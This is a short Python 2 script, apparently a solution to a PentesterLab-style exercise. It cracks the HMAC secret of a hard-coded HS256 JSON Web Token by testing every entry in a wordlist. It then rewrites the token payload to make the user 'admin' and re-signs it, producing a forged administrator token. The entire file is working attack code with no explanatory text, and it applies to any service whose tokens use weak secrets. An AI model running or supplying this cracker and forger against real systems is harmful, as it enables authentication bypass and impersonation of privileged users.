import base64
import hmac
import hashlib

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjpudWxsfQ.Tr0VvdP6rVBGBGuI_luxGCOaz6BbhC6IxRTlKOW8UjM"

header_enc,payload_enc,signature_enc = token.split('.')

header = base64.b64decode(token.split(".")[0])
payload = base64.b64decode(token.split(".")[1]+"==")
signature = base64.b64decode(token.split(".")[2]+"==")

print header,payload
print token
with open('wordlist.txt') as fp:
    #for secret in ['hacker', 'jwt', 'insecurity', 'pentesterlab', 'hacking']:
    for secret in fp.read().split('\n'):
        cur_signature_enc = base64.urlsafe_b64encode(hmac.new(secret, header_enc+'.'+payload_enc, hashlib.sha256).digest())
        if signature_enc == cur_signature_enc.replace('=',''):
            print "found secret: " + secret
            payload = payload.replace('null','"admin"')
            payload_enc = base64.urlsafe_b64encode(payload).replace('=','') 
            signature_enc = base64.urlsafe_b64encode(hmac.new(secret, header_enc+'.'+payload_enc, hashlib.sha256).digest())
            print header,payload
            print header_enc+'.'+payload_enc+'.'+signature_enc.replace('=','')
            break
